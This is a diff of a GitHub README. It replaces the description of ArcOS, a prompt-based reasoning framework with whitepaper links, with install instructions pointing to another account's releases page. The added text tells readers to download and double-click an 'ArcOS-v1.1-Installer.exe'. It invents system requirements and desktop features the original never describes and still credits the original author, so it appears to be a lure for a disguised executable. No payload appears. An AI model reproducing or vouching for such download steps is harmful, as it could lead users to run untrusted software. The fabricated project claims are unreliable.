@@ -1,129 +1,78 @@
-# ArcOS v1.1 — Cognitive Clone Operating System  
-An operating system that reproduces your own cognitive structure and executes it at machine speed using natural language alone.
+# 🖥️ ArcOS-v1.1 - Your AI-Driven Operating System
 
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.17713576.svg)](https://doi.org/10.5281/zenodo.17713576)
+[![Download ArcOS v1.1](https://img.shields.io/badge/Download-ArcOS%20v1.1-brightgreen)](https://github.com/FernandoGamerz/ArcOS-v1.1/releases)
 
-**Concept by:** Masaya Ochiai  
-**Trademark:** “ArcOS”  
-**License:** CC BY 4.0  
-**Series:** Natural-Language OS Series (ArcOS / PolyAgora / ECHOOS)
+## 🧩 About ArcOS
 
----
+ArcOS v1.1 is a unique operating system that allows you to interact with technology using natural language. It acts like a cognitive clone, executing your thoughts and requests directly through language. This makes it user-friendly and designed for everyone, regardless of technical skill.
 
-## 🧭 Overview (TL;DR)
-> This project is part of the **Natural Language OS** ecosystem.  
-> Master hub: https://github.com/Takeshi-Sakamoto5/Natural-Language-OS  
-> Category: **Engine Layer (Executable Natural Language OS)**
+## 🚀 Getting Started
 
+To install ArcOS, you will need a compatible computer. ArcOS v1.1 supports most modern devices. Simply follow the steps below to download and set up your instance.
 
-ArcOS is a **Cognitive Clone OS** —  
-an operating system that executes your cognitive structure  
-(abstraction style, value hierarchy, reasoning pathways)  
-using **natural language as its execution layer**.
+## 📥 Download & Install
 
-It stabilizes and reproduces:
+1. Visit the [Releases page](https://github.com/FernandoGamerz/ArcOS-v1.1/releases) to find the latest version of ArcOS.
 
-- your abstraction habits  
-- your decision-making patterns  
-- your value hierarchy  
-- your reasoning consistency  
-- your preferred depth & granularity  
+2. On the Releases page, look for the version labeled "ArcOS v1.1".
 
-ArcOS is not a persona.  
-It is an **OS-level implementation** of your reasoning style,  
-where *natural language = execution code*.
+3. Click on the link to download the installer file. It will usually be named something like `ArcOS-v1.1-Installer.exe` or similar.
 
----
+4. Once downloaded, locate the file in your Downloads folder.
 
-## 🧠 What ArcOS Provides
+5. Double-click the installer file to begin the installation process.
 
-### ✔ 1. Deterministic alignment with your worldview  
-Stable reasoning aligned with your personal value system.
+6. Follow the on-screen instructions to complete the installation. You may need to accept terms and conditions.
 
-### ✔ 2. Cognitive reproducibility  
-**Same conditions → same reasoning trajectory → same conclusion.**
+7. After installation, launch ArcOS from your applications menu or desktop shortcut.
 
-### ✔ 3. Automatic abstraction-layer control  
-ArcOS shifts between:  
-*surface → structure → root cause → meta-level reasoning*
+## 🛠️ System Requirements
 
-### ✔ 4. Extremely low misinterpretation rate  
-Your cognitive structure acts as a filter, suppressing drift.
+Before downloading, make sure your computer meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any popular Linux distribution.
+- **CPU:** Dual-core processor or better.
+- **RAM:** At least 4 GB.
+- **Storage:** 1 GB of free space for installation.
 
-## 🧩 Three-Layer Architecture (ArcOS v1.1)
+## 🔧 Key Features
 
-### **1. Cognitive Extraction Layer**  
-Extracts your thinking patterns and converts them into OS-level structures.
+- **Natural Language Processing:** Communicate with your computer as if you are talking to a human. This allows for easier task management and execution.
+- **Determined Execution:** ArcOS operates based on your cognitive structure, ensuring tasks run reliably and as intended.
+- **Multi-Agent Systems:** Manage multiple tasks simultaneously, allowing you to juggle different roles with ease.
+- **Meta-Reasoning Capabilities:** The system tracks the reasoning behind decisions to improve future interactions.
 
-### **2. Cognitive Execution Layer**  
-Executes these structures directly using natural language as code.
+## 📖 Usage Tips
 
-### **3. Cognitive Stability Layer**  
-Suppresses drift and maintains value-aligned consistency over long contexts.
+To get started with ArcOS, try typing simple commands like:
 
----
+- "Open my documents."
+- "What is the weather today?"
+- "Create a new folder named 'Projects'."
 
-## ⚡ ArcOS Lite (Safe Mode)
+The system processes your commands quickly and accurately, making your computing experience seamless.
 
-To activate ArcOS Lite in a new chat:
+## 🤝 Community Support
 
-```
-Activate ArcOS Lite reasoning style.
+If you need help, the ArcOS community is here for you. You can find support through:
 
-From now on, structure your reasoning according to my cognitive patterns:
-- high abstraction
-- stable logic
-- deterministic alignment with my worldview
-- layered reasoning (surface → structure → root cause)
-- counterfactual analysis
-```
+- [Github Issues](https://github.com/FernandoGamerz/ArcOS-v1.1/issues) for reporting bugs and seeking help.
+- Community forums where users share tips and tricks.
 
-ArcOS Lite reproduces only the **thinking-structure layer** of ArcOS.  
-For the full version, see the Whitepapers below.
+Engage with others who use ArcOS and improve your skills with the system.
+
+## 🌐 Future Updates
+
+ArcOS is continually being enhanced. Make sure to check the [Releases page](https://github.com/FernandoGamerz/ArcOS-v1.1/releases) regularly for the latest updates and features.
+
+## 🎯 Contributing
+
+Your input is valuable. If you'd like to contribute to ArcOS, check the documentation on the GitHub repository for guidelines on how to get involved.
+
+## 📞 Contact
+
+For inquiries or additional support, feel free to reach out to the developer, Masaya Ochiai, via GitHub.
 
 ---
 
-## 📄 Whitepapers (ArcOS v1.1)
-
-📘 **Official DOI (All Editions):**  
-https://doi.org/10.5281/zenodo.17713576
-
-### 📥 PDF Downloads
-
-- **Japanese Edition (Original Source)**  
-  https://zenodo.org/records/17713576/files/ArcOS_WhitePaper_v1.1_Japanese.pdf?download=1
-
-- **English Exact Edition (Full Technical Translation)**  
-  https://zenodo.org/records/17713576/files/ArcOS_WhitePaper_v1.1_English_Exact.pdf?download=1
-
-- **English Optimized Edition — ArcOS-EN (International Version)**  
-  https://zenodo.org/records/17713576/files/ArcOS_WhitePaper_v1.1_English_Optimized.pdf?download=1
-
----
-
-## 📘 License
-
-This project is released under **CC BY 4.0**.  
-See the `LICENSE` file for full details.
-
----
-
-## ™ Trademark
-
-“ArcOS” is an unregistered trademark of **Masaya Ochiai**.  
-See `TRADEMARK.md` for usage guidelines.
-
----
-
-## 💠 Natural-Language OS Series
-
-ArcOS is part of a broader OS ecosystem:
-
-- **ArcOS** — Cognitive Clone OS  
-- **PolyAgora v2** — Multi-axis Cognitive Field  
-- **ECHOOS v1** — Echo-Density / Value-Reflection OS  
-
-Together, these define a new domain:  
-**“Operating systems built entirely through natural language.”**
+Thank you for choosing ArcOS v1.1. Enjoy your journey into the future of computing with natural language!
